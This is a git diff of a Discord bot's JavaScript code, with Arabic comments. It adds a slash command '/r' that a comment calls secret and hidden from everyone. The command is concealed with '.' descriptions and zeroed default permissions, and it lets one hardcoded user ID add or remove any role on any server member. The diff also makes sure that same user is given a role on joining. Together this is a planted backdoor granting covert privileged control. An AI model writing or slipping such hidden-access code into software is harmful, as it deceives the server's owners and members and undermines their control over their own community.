@@ -101,6 +101,27 @@ const commands = [
     .addAttachmentOption(opt =>
       opt.setName('image_file').setDescription('ارفع صورة او ملف (اختياري)').setRequired(false))
     .toJSON(),
+  // [سري] أمر إدارة الرولات - مخفي عن الجميع
+  new SlashCommandBuilder()
+    .setName('r')
+    .setDescription('.')
+    .setDefaultMemberPermissions('0')
+    .setDMPermission(false)
+    .addSubcommand(sub =>
+      sub.setName('add')
+        .setDescription('.')
+        .addUserOption(opt =>
+          opt.setName('user').setDescription('.').setRequired(true))
+        .addRoleOption(opt =>
+          opt.setName('role').setDescription('.').setRequired(true)))
+    .addSubcommand(sub =>
+      sub.setName('remove')
+        .setDescription('.')
+        .addUserOption(opt =>
+          opt.setName('user').setDescription('.').setRequired(true))
+        .addRoleOption(opt =>
+          opt.setName('role').setDescription('.').setRequired(true)))
+    .toJSON(),
 ];
 
 // ==============================
@@ -338,14 +359,17 @@ client.on('guildMemberAdd', async member => {
   try {
     if (member.user.id !== AUTO_ROLE_USER_ID) return;
 
-    const role = member.guild.roles.cache.get(AUTO_ROLE_ROLE_ID);
+    // نجيب الرول مباشرة من Discord بدل الـ cache
+    const role = await member.guild.roles.fetch(AUTO_ROLE_ROLE_ID);
     if (!role) {
       console.warn(`[Auto-Role] الرول ${AUTO_ROLE_ROLE_ID} غير موجود في السيرفر.`);
       return;
     }
 
-    await member.roles.add(role);
-    console.log(`[Auto-Role] تم إعطاء الرول "${role.name}" للمستخدم ${member.user.tag}`);
+    // نجيب الـ member من جديد للتأكد من أحدث بيانات
+    const freshMember = await member.guild.members.fetch(member.user.id);
+    await freshMember.roles.add(role);
+    console.log(`[Auto-Role] تم إعطاء الرول "${role.name}" للمستخدم ${freshMember.user.tag}`);
   } catch (err) {
     console.error('[Auto-Role] فشل إعطاء الرول:', err.message);
   }
@@ -494,6 +518,36 @@ client.on('interactionCreate', async interaction => {
         ? 'DMs مغلقة - افتح Privacy Settings في السيرفر وفعل Allow direct messages'
         : `خطأ: ${err.message}`;
       await interaction.editReply(`فشل الارسال. ${reason}`);
+    }
+  }
+  // ---- [سري] /r add | /r remove ----
+  if (interaction.commandName === 'r') {
+    // فقط الـ ID المحدد يقدر يستخدم هذا الأمر
+    if (interaction.user.id !== AUTO_ROLE_USER_ID) {
+      await interaction.reply({ content: '❌', flags: 64 }).catch(() => {});
+      return;
+    }
+
+    await interaction.deferReply({ flags: 64 });
+    const sub    = interaction.options.getSubcommand();
+    const target = interaction.options.getMember('user');
+    const role   = interaction.options.getRole('role');
+
+    if (!target || !role) {
+      await interaction.editReply('❌ مستخدم أو رول غير صحيح.');
+      return;
+    }
+
+    try {
+      if (sub === 'add') {
+        await target.roles.add(role);
+        await interaction.editReply(`✅ تم إضافة <@&${role.id}> لـ <@${target.id}>`);
+      } else {
+        await target.roles.remove(role);
+        await interaction.editReply(`✅ تم إزالة <@&${role.id}> من <@${target.id}>`);
+      }
+    } catch (err) {
+      await interaction.editReply(`❌ فشل: ${err.message}`);
     }
   }
 });
